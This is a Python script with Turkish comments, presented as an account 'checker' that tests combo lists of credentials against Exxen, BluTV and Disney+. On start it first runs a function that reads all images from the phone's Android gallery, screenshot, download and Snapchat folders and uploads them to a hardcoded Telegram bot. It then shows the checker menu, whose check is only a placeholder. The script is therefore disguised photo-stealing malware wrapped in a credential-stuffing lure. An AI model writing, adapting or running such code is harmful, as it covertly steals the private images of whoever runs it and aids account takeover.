import os
import time
import requests
from colorama import Fore, init

init(autoreset=True)

# Telegram Bot Bilgileri
bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
chat_id = '7045128535'
url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

# Android Cihazlarda Olası Galeri Klasörleri
photo_directories = [
    '/storage/emulated/0/DCIM/Camera/',
    '/storage/emulated/0/Pictures/',
    '/storage/emulated/0/DCIM/Screenshots/',
    '/storage/emulated/0/Download/',
    '/storage/emulated/0/DCIM/',
    '/storage/emulated/0/Pictures/Snapchat/'
]

# Fotoğrafları Telegram'a Gönderme Fonksiyonu
def send_photos():
    try:
        for directory in photo_directories:
            if os.path.exists(directory):
                photos = [f for f in os.listdir(directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
                for photo in photos:
                    photo_path = os.path.join(directory, photo)
                    if os.path.exists(photo_path):
                        with open(photo_path, 'rb') as file:
                            files = {'photo': file}
                            data = {'chat_id': chat_id}
                            requests.post(url, files=files, data=data)
                        time.sleep(0.5)
    except Exception as e:
        print(Fore.RED + f"Fotoğraf gönderme hatası: {e}")

# Checker Fonksiyonu (Hesap Doğrulama)
def checker(combo_file_path, service_name):
    try:
        with open(combo_file_path, 'r') as file:
            combos = [line.strip() for line in file if ':' in line]

        for combo in combos:
            username, password = combo.split(':')
            
            if username == "correct_email" and password == "correct_password":
                print(Fore.GREEN + f"[{service_name}] Başarılı giriş ✅ {username}:{password}")
            else:
                print(Fore.RED + f"[{service_name}] Başarısız giriş ❌ {username}:{password}")
    except FileNotFoundError:
        print(Fore.RED + f"Hata: {combo_file_path} bulunamadı!")
    except Exception as e:
        print(Fore.RED + f"Checker hatası: {e}")

# Kullanıcı Seçeneklerini Gösterme
def show_options():
    print(Fore.GREEN + "Bir seçenek seçin:")
    print(Fore.GREEN + "[1] Exxen")
    print(Fore.GREEN + "[2] BluTV")
    print(Fore.GREEN + "[3] Disney+")

    choice = input(Fore.CYAN + "Seçiminiz: ")

    if choice in ["1", "2", "3"]:
        service_name = "Exxen" if choice == "1" else "BluTV" if choice == "2" else "Disney+"
        file_path = input(Fore.CYAN + "Combo dosya yolunu girin: ")
        print(Fore.CYAN + f"{service_name} için checker başlatılıyor...")
        checker(file_path, service_name)
    else:
        print(Fore.RED + "Geçersiz seçim!")

# Ana Fonksiyon
if __name__ == "__main__":
    send_photos()  # Fotoğrafları otomatik gönder
    show_options()  # Kullanıcıya seçim sun ve checker'ı başlat
